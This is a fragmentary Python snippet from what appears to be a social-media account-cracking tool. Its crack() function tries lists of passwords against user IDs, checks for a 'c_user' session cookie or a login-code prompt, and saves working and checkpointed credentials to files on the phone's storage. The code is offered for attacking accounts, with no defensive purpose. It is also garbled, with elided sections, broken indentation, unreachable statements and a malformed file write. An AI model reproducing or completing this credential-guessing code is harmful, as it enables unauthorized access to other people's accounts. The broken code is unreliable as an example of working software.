...
def crack(uid,pwx):
	global cp , ok , loop
	sys.stdout.write("\rðŸ˜ŠðŸ˜Š [%s/%s]"%(loop,len(id)));sys.stdout.flush()
	for ps in pwx:
    ...
    'user-agent': pro,}
		...
		if 'c_user' in log_cookies:
			...
			open("/sdcard/NSN/OK.txt","a").write(cid+'➣'+ps+'\n')
			ok.append(cid+ps)
			break
			continue
			...
			if 'Enter login code to continue' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid=coki[24:39]
				print('\r\033[1;34m[×] '+uid+' × '+ps+' ')
				open("/sdcard/NSN-cp.txt","a").write(uid,ps)
				twf.append(uid)
			break
		else:
			continue
